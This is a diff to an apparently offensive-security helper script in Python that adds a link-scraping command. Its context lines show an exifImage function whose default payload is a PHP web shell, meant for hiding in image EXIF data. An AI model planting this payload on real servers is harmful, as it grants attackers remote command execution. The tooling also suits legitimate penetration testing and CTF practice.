@@ -1,9 +1,14 @@
+#!/usr/bin/env python
+
 import random
 import socket
 import netifaces as ni
+import requests
 import sys
 import exif
 import PIL
+import os
+from bs4 import BeautifulSoup
 
 def getAddress(interface="tun0"):
     if not interface in ni.interfaces():
@@ -135,6 +140,22 @@ def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_t
     else:
         print("Invalid output argument.")
 
+def collectUrls(input):
+    if not isinstance(input, BeautifulSoup):
+        input = BeautifulSoup(input, "html.parser")
+
+    urls = set()
+    attrs = ["src","href"]
+    tags = ["a","link","script","img"]
+
+    for tag in tags:
+        for e in input.find_all(tag):
+            for attr in attrs:
+                if e.has_attr(attr):
+                    urls.add(e[attr])
+
+    return urls
+
 if __name__ == "__main__":
     bin = sys.argv[0]
     if len(sys.argv) < 2:
@@ -172,3 +193,22 @@ if __name__ == "__main__":
                 _out = ".".join(_out[0:-1]) + "_exif." + _out[-1]
 
             exifImage(payload, _in, _out, tag)
+    elif command == "collectUrls":
+        if len(sys.argv) < 3:
+            print("Usage: %s collectUrls <url/file>" % bin)
+        else:
+            uri = sys.argv[2]
+            if os.path.isfile(uri):
+                data = open(uri,"r").read()
+            else:
+                res = requests.get(uri)
+                if res.status_code != 200:
+                    print("%s returned: %d %s" % (uri, res.status_code, res.reason))
+                    exit()
+                data = res.text
+            for item in sorted(collectUrls(data)):
+                print(item)
+    elif command == "help":
+        print("Usage: %s [command]" % bin)
+        print("Available commands:")
+        print("   help, getAddress, pad, collectUrls, exifImage")
